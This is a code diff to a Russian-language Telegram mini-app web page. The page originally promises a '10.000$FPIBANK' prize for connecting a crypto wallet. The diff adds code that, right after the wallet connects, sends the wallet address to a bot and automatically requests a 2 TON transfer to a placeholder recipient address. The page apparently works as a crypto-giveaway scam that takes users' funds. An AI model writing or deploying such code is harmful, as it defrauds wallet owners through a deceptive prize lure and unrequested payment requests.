@@ -39,6 +39,7 @@
             cursor: pointer;
             width: 100%;
             font-size: 16px;
+            margin-top: 10px;
         }
         button:hover {
             background: #0077b6;
@@ -48,8 +49,7 @@
 <body>
     <div class="container">
         <img src="https://raw.githubusercontent.com/RFRFQRFARFQF/Telegram-mini-app/main/photo.jpg" alt="Фото">
-        <p>ПОЛУЧИТЬ 10.000$FPIBANK</p>
-        <p>ПОДКЛЮЧИ КОШЕЛЕК ДЛЯ ПОЛУЧЕНИЯ ПРИЗА</p>
+        <p>ПОДКЛЮЧИ КОШЕЛЕК И ОТПРАВЬ 2 TON</p>
         <button id="connect-wallet">CONNECT WALLET</button>
     </div>
 
@@ -66,11 +66,25 @@
                 const connectedWallet = await tonConnect.connect();
                 if (connectedWallet) {
                     const walletAddress = connectedWallet.account.address;
-                    tg.sendData(JSON.stringify({ wallet: walletAddress })); // Отправляем кошелек в бота
+                    
+                    // Отправляем кошелек боту
+                    tg.sendData(JSON.stringify({ wallet: walletAddress }));
+
+                    // Показываем алерт о подключении
                     tg.showAlert("Кошелек подключен: " + walletAddress);
+
+                    // Автоматически создаем запрос на перевод 2 TON
+                    const transaction = {
+                        to: "EQC3DQ...ЗАМЕНИТЕ_НА_АДРЕС",  // Адрес получателя
+                        value: "2000000000",  // 2 TON (в нанотонах)
+                        payload: "",  // Можно добавить комментарий
+                    };
+
+                    await tonConnect.sendTransaction(transaction);
+                    tg.showAlert("Транзакция создана! Подтвердите в кошельке.");
                 }
             } catch (error) {
-                tg.showAlert("Ошибка подключения: " + error.message);
+                tg.showAlert("Ошибка: " + error.message);
             }
         });
 
